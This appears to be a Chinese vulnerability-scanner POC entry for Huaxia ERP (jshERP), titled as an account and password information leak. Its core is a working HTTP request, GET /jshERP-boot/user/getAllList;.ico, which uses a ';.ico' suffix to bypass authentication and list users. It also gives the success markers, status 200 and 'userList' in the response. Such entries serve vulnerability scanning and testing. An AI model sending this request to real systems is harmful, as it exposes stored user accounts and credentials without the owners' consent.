﻿# 华夏ERP账号密码信息泄露

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：userList

> 上传文件定位：

> 验证文件来源：华夏ERP账号密码信息泄露.poc
